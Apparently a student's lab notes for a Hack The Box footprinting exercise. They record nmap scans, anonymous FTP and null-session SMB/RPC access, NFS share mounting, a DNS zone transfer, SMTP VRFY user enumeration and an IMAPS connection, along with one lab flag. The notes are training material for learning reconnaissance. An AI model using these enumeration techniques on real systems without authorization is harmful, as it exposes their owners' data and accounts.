- What can we see?
- What reasons can we have for seeing it?
- What image does what we see create for us?
- What do we gain from it?
- How can we use it?
- What can we not see?
- What reasons can there be that we do not see?
- What image results for us from what we do not see?
-
![](Attachments/Pasted%20image%2020260825113158.png)

| **Layer**                | **Description**                                                                                        | **Information Categories**                                                                         |
| ------------------------ | ------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `1. Internet Presence`   | Identification of internet presence and externally accessible infrastructure.                          | Domains, Subdomains, vHosts, ASN, Netblocks, IP Addresses, Cloud Instances, Security Measures      |
| `2. Gateway`             | Identify the possible security measures to protect the company's external and internal infrastructure. | Firewalls, DMZ, IPS/IDS, EDR, Proxies, NAC, Network Segmentation, VPN, Cloudflare                  |
| `3. Accessible Services` | Identify accessible interfaces and services that are hosted externally or internally.                  | Service Type, Functionality, Configuration, Port, Version, Interface                               |
| `4. Processes`           | Identify the internal processes, sources, and destinations associated with the services.               | PID, Processed Data, Tasks, Source, Destination                                                    |
| `5. Privileges`          | Identification of the internal permissions and privileges to the accessible services.                  | Groups, Users, Permissions, Restrictions, Environment                                              |
| `6. OS Setup`            | Identification of the internal components and systems setup.                                           | OS Type, Patch Level, Network config, OS Environment, Configuration files, sensitive private files |
# FTP

Q1. Which version of the FTP server is running on the target system? Submit the entire banner as the answer.

```
sudo nmap -sCV 10.129.129.88                            
[sudo] password for satoru: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-25 12:28 +0530
Nmap scan report for 10.129.129.88
Host is up (0.42s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 InFreight FTP v1.1
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      41291/tcp6  mountd
|   100005  1,2,3      42241/tcp   mountd
|   100005  1,2,3      50622/udp6  mountd
|   100005  1,2,3      56742/udp   mountd
|   100021  1,3,4      39283/tcp6  nlockmgr
|   100021  1,3,4      39399/tcp   nlockmgr
|   100021  1,3,4      53039/udp   nlockmgr
|   100021  1,3,4      58822/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
2049/tcp open  nfs         3-4 (RPC #100003)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.99%I=7%D=8/25%Time=6A8D3D0F%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,74,"220\x20InFreight\x20FTP\x20v1\.1\r\n500\x20Invalid\x20comm
SF:and:\x20try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\
SF:x20try\x20being\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-08-25T06:59:06
|_  start_date: N/A
|_nbstat: NetBIOS name: DEVSMB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: 22s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.02 seconds

```

Q2. Enumerate the FTP server and find the flag.txt file. Submit the contents of it as the answer.

```
tp 10.129.129.88             
Connected to 10.129.129.88.
220 InFreight FTP v1.1
Name (10.129.129.88:satoru): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.

```

# SMB

Q1. What version of the SMB server is running on the target system? Submit the entire banner as the answer.

```
sudo nmap -sCV 10.129.129.88
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-25 12:40 +0530
Stats: 0:02:19 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 83.33% done; ETC: 12:43 (0:00:27 remaining)
Stats: 0:02:24 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 83.33% done; ETC: 12:43 (0:00:28 remaining)
Nmap scan report for 10.129.129.88
Host is up (0.31s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp?
| fingerprint-strings: 
|   GenericLines: 
|     220 InFreight FTP v1.1
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
111/tcp  open  rpcbind     2-4 (RPC #100000)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
2049/tcp open  nfs         3-4 (RPC #100003)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.99%I=7%D=8/25%Time=6A8D3FFC%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,74,"220\x20InFreight\x20FTP\x20v1\.1\r\n500\x20Invalid\x20comm
SF:and:\x20try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\
SF:x20try\x20being\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: DEVSMB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-08-25T07:13:50
|_  start_date: N/A
|_clock-skew: 22s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 230.84 seconds
                                                                                    
```

Q2. What is the name of the accessible share on the target?

```
 smbmap -H 10.129.129.88

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

<snip>
                                                                                                    
[+] IP: 10.129.129.88:445       Name: 10.129.129.88             Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        sambashare                                              READ ONLY       InFreight SMB v3.1
        IPC$                                                    NO ACCESS       IPC Service (Inl
```

Q3. Connect to the discovered share and find the flag.txt file. Submit the contents as the answer.

```
mbclient  -N \\\\10.129.129.88\\sambashare
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Nov  8 19:13:14 2021
  ..                                  D        0  Mon Nov  8 21:23:19 2021
  .profile                            H      807  Tue Feb 25 17:33:22 2020
  contents                            D        0  Mon Nov  8 19:13:45 2021
  .bash_logout                        H      220  Tue Feb 25 17:33:22 2020
  .bashrc                             H     3771  Tue Feb 25 17:33:22 2020

                5090944 blocks of size 1024. 1765940 blocks available
smb: \> cd contents
smb: \contents\> ls
  .                                   D        0  Mon Nov  8 19:13:45 2021
  ..                                  D        0  Mon Nov  8 19:13:14 2021
  flag.txt                            N       38  Mon Nov  8 19:13:45 2021

                5090944 blocks of size 1024. 1765936 blocks available
smb: \contents\> 


```

Q4. Find out which domain the server belongs to.

```
rpcclient -U  "" 10.129.129.88 -N
rpcclient $> querydominfo
Domain:         DEVOPS
Server:         DEVSMB
Comment:        InlaneFreight SMB server (Samba, Ubuntu)
Total Users:    0
Total Groups:   0
Total Aliases:  0
Sequence No:    1787642805
Force Logoff:   4294967295
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1

```

Q5. Find additional information about the specific share we found previously and submit the customized version of that specific share as the answer.

```
rpcclient $> netsharegetinfo sambashare
netname: sambashare
        remark: InFreight SMB v3.1
        path:   C:\home\sambauser\
        password:
        type:   0x0
        perms:  0
        max_uses:       -1
        num_uses:       1
revision: 1
type: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE 
DACL
        ACL     Num ACEs:       1       revision:       2
        ---
        ACE
                type: ACCESS ALLOWED (0) flags: 0x00 
                Specific bits: 0x1ff
                Permissions: 0x1f01ff: SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS 
                SID: S-1-1-0

```

Q6. What is the full system path of that specific share? (format: "/directory/names")

```
rpcclient $> netsharegetinfo sambashare
netname: sambashare
        remark: InFreight SMB v3.1
        path:   C:\home\sambauser\
        password:
        type:   0x0
        perms:  0
        max_uses:       -1
        num_uses:       1

```

# NFS

Q1. Enumerate the NFS service and submit the contents of the flag.txt in the "nfs" share as the answer.

```
┌──(satoru㉿satoru)-[~/Desktop/HTB/CPTS/skills]
└─$ showmount -e 10.129.129.126
Export list for 10.129.129.126:
/var/nfs      10.0.0.0/8
/mnt/nfsshare 10.0.0.0/8
                                                                                                
┌──(satoru㉿satoru)-[~/Desktop/HTB/CPTS/skills]
└─$ mkdir nfs          
                                                                                                
┌──(satoru㉿satoru)-[~/Desktop/HTB/CPTS/skills]
└─$ sudo mount -t nfs 10.129.129.126:/ ./nfs -o nolock      
                                                                                                
┌──(satoru㉿satoru)-[~/Desktop/HTB/CPTS/skills]
└─$ cd nfs               
                                                                                                
┌──(satoru㉿satoru)-[~/…/HTB/CPTS/skills/nfs]
└─$ tree 
.
├── mnt
│   └── nfsshare
│       └── flag.txt
└── var
    └── nfs
        └── flag.txt

5 directories, 2 files
                                                                                                
```

Q2. Enumerate the NFS service and submit the contents of the flag.txt in the "nfsshare" share as the answer.

```
┌──(satoru㉿satoru)-[~/Desktop/HTB/CPTS/skills]
└─$ showmount -e 10.129.129.126
Export list for 10.129.129.126:
/var/nfs      10.0.0.0/8
/mnt/nfsshare 10.0.0.0/8
                                                                                                
┌──(satoru㉿satoru)-[~/Desktop/HTB/CPTS/skills]
└─$ mkdir nfs          
                                                                                                
┌──(satoru㉿satoru)-[~/Desktop/HTB/CPTS/skills]
└─$ sudo mount -t nfs 10.129.129.126:/ ./nfs -o nolock      
                                                                                                
┌──(satoru㉿satoru)-[~/Desktop/HTB/CPTS/skills]
└─$ cd nfs               
                                                                                                
┌──(satoru㉿satoru)-[~/…/HTB/CPTS/skills/nfs]
└─$ tree 
.
├── mnt
│   └── nfsshare
│       └── flag.txt
└── var
    └── nfs
        └── flag.txt

5 directories, 2 files
                                                                                                
```

# DNS

Q1. Interact with the target DNS using its IP address and enumerate the FQDN of it for the "inlanefreight.htb" domain.

```
dig ns inlanefreight.htb @10.129.129.128

; <<>> DiG 9.20.26-1-Debian <<>> ns inlanefreight.htb @10.129.129.128
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 37539
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: d45af8df89de4761010000006a8d5b64491dff566a904b1d (good)
;; QUESTION SECTION:
;inlanefreight.htb.             IN      NS

;; ANSWER SECTION:
inlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.

;; ADDITIONAL SECTION:
ns.inlanefreight.htb.   604800  IN      A       127.0.0.1

;; Query time: 304 msec
;; SERVER: 10.129.129.128#53(10.129.129.128) (UDP)
;; WHEN: Tue Aug 25 14:37:43 IST 2026
;; MSG SIZE  rcvd: 107

```

Q2. Identify if its possible to perform a zone transfer and submit the TXT record as the answer. (Format: HTB{...})

```
 dig axfr internal.inlanefreight.htb @10.129.129.128

; <<>> DiG 9.20.26-1-Debian <<>> axfr internal.inlanefreight.htb @10.129.129.128
;; global options: +cmd
internal.inlanefreight.htb. 604800 IN   SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
internal.inlanefreight.htb. 604800 IN   TXT     "MS=ms97310371"
internal.inlanefreight.htb. 604800 IN   TXT     "HTB{DN5_z0N3_7r4N5F3r_iskdufhcnlu34}"
internal.inlanefreight.htb. 604800 IN   TXT     "atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
internal.inlanefreight.htb. 604800 IN   TXT     "v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
internal.inlanefreight.htb. 604800 IN   NS      ns.inlanefreight.htb.
dc1.internal.inlanefreight.htb. 604800 IN A     10.129.34.16
dc2.internal.inlanefreight.htb. 604800 IN A     10.129.34.11
mail1.internal.inlanefreight.htb. 604800 IN A   10.129.18.200
ns.internal.inlanefreight.htb. 604800 IN A      127.0.0.1
vpn.internal.inlanefreight.htb. 604800 IN A     10.129.1.6
ws1.internal.inlanefreight.htb. 604800 IN A     10.129.1.34
ws2.internal.inlanefreight.htb. 604800 IN A     10.129.1.35
wsus.internal.inlanefreight.htb. 604800 IN A    10.129.18.2
internal.inlanefreight.htb. 604800 IN   SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 312 msec
;; SERVER: 10.129.129.128#53(10.129.129.128) (TCP)
;; WHEN: Tue Aug 25 14:45:06 IST 2026
;; XFR size: 15 records (messages 1, bytes 677)

```

Q3.  What is the IPv4 address of the hostname DC1?

```
└─$ dig axfr internal.inlanefreight.htb @10.129.129.128 | grep dc1     
dc1.internal.inlanefreight.htb. 604800 IN A     10.129.34.16
                                                                    
```

Q4.  What is the FQDN of the host where the last octet ends with "x.x.x.203"?

```
try with fierce-hostlist

```

# SMTP

Q1. Enumerate the SMTP service and submit the banner, including its version as the answer.

```
 sudo nmap -sCV 10.129.129.128 -F                             
[sudo] password for satoru: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-25 14:53 +0530
Nmap scan report for 10.129.129.128
Host is up (0.32s latency).
Not shown: 92 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
25/tcp   open  smtp
|_smtp-commands: mail1, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
| fingerprint-strings: 
|   Hello: 
|     220 InFreight ESMTP v2.11
|     Syntax: EHLO hostname
|   Help: 
|_    220 InFreight ESMTP v2.11

```

Q2.  Enumerate the SMTP service even further and find the username that exists on the system. Submit it as the answer.

```
smtp-user-enum -M VRFY -U footprinting-wordlist.txt -t 10.129.133.198 -w 20 
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... footprinting-wordlist.txt
Target count ............. 1
Username count ........... 101
Target TCP port .......... 25
Query timeout ............ 20 secs
Target domain ............ 

######## Scan started at Thu Aug 27 14:23:13 2026 #########
10.129.133.198: robin exists
######## Scan completed at Thu Aug 27 14:26:45 2026 #########
1 results.

101 queries in 212 seconds (0.5 queries / sec)

```
or else we can also use nmap script to enum users in smtp
# IMAP / POP3

Q1. Figure out the exact organization name from the IMAP/POP3 service and submit it as the answer.

Q2 .What is the FQDN that the IMAP and POP3 servers are assigned to?

```
sudo nmap -sCV 10.129.133.198                                               
[sudo] password for satoru: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-27 14:42 +0530
Nmap scan report for 10.129.133.198
Host is up (0.33s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
25/tcp   open  smtp
|_smtp-commands: mail1, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
| fingerprint-strings: 
|   Hello: 
|     220 InFreight ESMTP v2.11
|     Syntax: EHLO hostname
|   Help: 
|_    220 InFreight ESMTP v2.11
53/tcp   open  domain   ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
110/tcp  open  pop3     Dovecot pop3d
|_pop3-capabilities: PIPELINING TOP SASL RESP-CODES STLS CAPA UIDL AUTH-RESP-CODE
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
143/tcp  open  imap     Dovecot imapd
|_imap-capabilities: IMAP4rev1 post-login STARTTLS more LOGIN-REFERRALS ID have listed capabilities Pre-login ENABLE IDLE SASL-IR OK LITERAL+ LOGINDISABLEDA0001
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Dovecot imapd
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: IMAP4rev1 post-login SASL-IR LOGIN-REFERRALS ID more have listed capabilities ENABLE Pre-login AUTH=PLAINA0001 OK IDLE LITERAL+
995/tcp  open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-11-08T23:10:05
|_Not valid after:  2295-08-23T23:10:05
|_pop3-capabilities: PIPELINING TOP SASL(PLAIN) RESP-CODES USER CAPA UIDL AUTH-RESP-CODE
|_ssl-date: TLS randomness does not represent time
3306/tcp open  mysql    MySQL 8.0.27-0ubuntu0.20.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.27-0ubuntu0.20.04.1
|   Thread ID: 9
|   Capabilities flags: 65535
|   Some Capabilities: LongColumnFlag, IgnoreSigpipes, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, SupportsTransactions, InteractiveClient, LongPassword, Support41Auth, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, FoundRows, SupportsLoadDataLocal, ODBCClient, ConnectWithDatabase, SupportsCompression, IgnoreSpaceBeforeParenthesis, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: \x11UEe\4F5n3"i%Kp\x12\x1F5Z\x04
|_  Auth Plugin Name: caching_sha2_password
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.99%I=7%D=8/27%Time=6A8FFFAE%P=x86_64-pc-linux-gnu%r(Hell
SF:o,36,"220\x20InFreight\x20ESMTP\x20v2\.11\r\n501\x20Syntax:\x20EHLO\x20
SF:hostname\r\n")%r(Help,1B,"220\x20InFreight\x20ESMTP\x20v2\.11\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.04 seconds
                                                                                            
```

Q3. Enumerate the IMAP service and submit the flag as the answer. (Format: HTB{...})


```
openssl s_client -connect 10.129.133.198:993 -crlf
Connecting to 10.129.133.198
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 C=UK, ST=London, L=London, O=InlaneFreight Ltd, OU=DevOps DepÃartment, CN=dev.inlanefreight.htb, emailAddress=cto.dev@dev.inlanefreight.htb
verify error:num=18:self-signed certificate
verify return:1
depth=0 C=UK, ST=London, L=London, O=InlaneFreight Ltd, OU=DevOps DepÃartment, CN=dev.inlanefreight.htb, emailAddress=cto.dev@dev.inlanefreight.htb
verify return:1
---
Certificate chain
 0 s:C=UK, ST=London, L=London, O=InlaneFreight Ltd, OU=DevOps DepÃartment, CN=dev.inlanefreight.htb, emailAddress=cto.dev@dev.inlanefreight.htb
   i:C=UK, ST=London, L=London, O=InlaneFreight Ltd, OU=DevOps DepÃartment, CN=dev.inlanefreight.htb, emailAddress=cto.dev@dev.inlanefreight.htb
   a:PKEY: RSA, 2048 (bit); sigalg: sha256WithRSAEncryption
   v:NotBefore: Nov  8 23:10:05 2021 GMT; NotAfter: Aug 23 23:10:05 2295 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIEUzCCAzugAwIBAgIUDf35PqFuv6Uv0EECM8dFmNSZoY8wDQYJKoZIhvcNAQEL
BQAwgbcxCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxv
bmRvbjEaMBgGA1UECgwRSW5sYW5lRnJlaWdodCBMdGQxHDAaBgNVBAsME0Rldk9w
cyBEZXDDg2FydG1lbnQxHjAcBgNVBAMMFWRldi5pbmxhbmVmcmVpZ2h0Lmh0YjEs
MCoGCSqGSIb3DQEJARYdY3RvLmRldkBkZXYuaW5sYW5lZnJlaWdodC5odGIwIBcN
MjExMTA4MjMxMDA1WhgPMjI5NTA4MjMyMzEwMDVaMIG3MQswCQYDVQQGEwJVSzEP
MA0GA1UECAwGTG9uZG9uMQ8wDQYDVQQHDAZMb25kb24xGjAYBgNVBAoMEUlubGFu
ZUZyZWlnaHQgTHRkMRwwGgYDVQQLDBNEZXZPcHMgRGVww4NhcnRtZW50MR4wHAYD
VQQDDBVkZXYuaW5sYW5lZnJlaWdodC5odGIxLDAqBgkqhkiG9w0BCQEWHWN0by5k
ZXZAZGV2LmlubGFuZWZyZWlnaHQuaHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
MIIBCgKCAQEAxvMwFE6m+iBUSujb5d6DUy1xDYR5awzQRwddyvq6iBrMxbnptSrn
+j0UOKWHCOpD5LREwP26ghUg0lVJzfo+v5pQJGnxEXKg0OFlzWEd8xgx/JWW/z1/
rDsWlNa2yYZkCy68YWJlC7UZxvcDFrI0V0pDJIkrjForw26laoYDkrh1A5F8uUXD
1TwRLLYo+NGmtNHT3BADJpv6aFUZ4CGrqBQNi7XpsTZ948WLhUwQvWmebiK06Dai
TvMNKBctjWAiNI4xvq34W9hIUaPxT1JJzuujRslep6nHGHW00QEWTWgyOMYThc3b
HtKIHMfDLTUMz7s8RhVVwlWE6+ly1DMRgQIDAQABo1MwUTAdBgNVHQ4EFgQUGDTC
9B5KCKPWT7vXbnMunL/mEE4wHwYDVR0jBBgwFoAUGDTC9B5KCKPWT7vXbnMunL/m
EE4wDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEADh0v5XWCf3KO
atrWcoiIOC67Z0ZIO7yEF+fQo8z+Wx1dWzmCFVu7u4+l7slcdJICCGBbOX8eItWS
chwzgnWJToyX8PWY8lSaB8ifMDQcr457Y7O6NmvgU35sRcLnYYqXzu2oh0lxsFLR
vL1wpyDLPhhoI++j1fELhiJ3GWiUQrb0vfJPcbSkHTgzf0hm7mLJTaqt3WfS/Gr2
8Oh7vSfzvqvHLE7HHAO0G5Q81zo+wWsrQF0s40HEF/raEMfOy2Htm79YjyjAlLWf
ueS+u8rX2smOYdRIpL3UPx7+yZPGu47vYoetde1Z5cfTCgmeS05BQ2qMOp6Tw6+G
xUuqg8nK1Q==
-----END CERTIFICATE-----
subject=C=UK, ST=London, L=London, O=InlaneFreight Ltd, OU=DevOps DepÃartment, CN=dev.inlanefreight.htb, emailAddress=cto.dev@dev.inlanefreight.htb
issuer=C=UK, ST=London, L=London, O=InlaneFreight Ltd, OU=DevOps DepÃartment, CN=dev.inlanefreight.htb, emailAddress=cto.dev@dev.inlanefreight.htb
---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: rsa_pss_rsae_sha256
Peer Temp Key: X25519, 253 bits
---
SSL handshake has read 1667 bytes and written 1738 bytes
Verification error: self-signed certificate
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Protocol: TLSv1.3
Server public key is 2048 bit
This TLS version forbids renegotiation.
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 18 (self-signed certificate)
---
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: B43159A70F06ED0FE5E9B7A41BAC7DC780E57D6552D4F9573229705A88912976
    Session-ID-ctx: 
    Resumption PSK: 8CBF65A7BE032CBEFE2C519995A05CEC7DA6A98FDE13B70E0A8BBBB052AC402577DB35C9E55BF6095ADF51F45A34FD70
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 1f 76 fd 6d d1 b7 cb 91-f0 78 4a e8 9e d3 38 b8   .v.m.....xJ...8.
    0010 - c1 d8 38 2a fb b5 40 f0-ed 45 38 f6 f5 5a fc 07   ..8*..@..E8..Z..
    0020 - 7f 63 32 35 10 28 0b 0a-ae 32 02 a7 bc bb 25 ec   .c25.(...2....%.
    0030 - 02 50 7d 96 11 d3 87 34-d3 ed 73 a0 9a fb 4e 55   .P}....4..s...NU
    0040 - 90 20 aa 59 ec 19 e6 66-68 b5 18 cc 2d 14 91 00   . .Y...fh...-...
    0050 - 5b df c3 5a 7d 2e 93 b4-6d 53 1c ee 97 1b 4b cd   [..Z}...mS....K.
    0060 - 5b db 69 04 ee be 8c 7c-4c a3 e3 09 47 c2 f6 a2   [.i....|L...G...
    0070 - e6 0c 2a c1 6d ff b9 c0-67 5a 74 d0 e9 04 33 08   ..*.m...gZt...3.
    0080 - d9 12 e8 3b 89 7c 45 b8-de f1 4b 9f fe 1e b3 c9   ...;.|E...K.....
    0090 - fc 72 a4 4f 46 56 b2 f4-64 83 61 fb 4d 86 ee 78   .r.OFV..d.a.M..x
    00a0 - da 8c dd 64 bd 33 9b db-94 c9 b4 ee 99 eb d7 cc   ...d.3..........
    00b0 - c3 1e ff 67 85 4f 01 a4-53 38 83 f3 86 a4 8d 8d   ...g.O..S8......

    Start Time: 1787822423
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 08F1A17CAA121CFD68D8D335A20E2909E040543E6FD6DADFFBFD6EB555F51E33
    Session-ID-ctx: 
    Resumption PSK: 0361CF83AF88C19BB8B8A7917E7C05783230595D0A07D79D6235C4647AF28607F264787A08ED0C71EEF68E9D8BB5910F
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 1f 76 fd 6d d1 b7 cb 91-f0 78 4a e8 9e d3 38 b8   .v.m.....xJ...8.
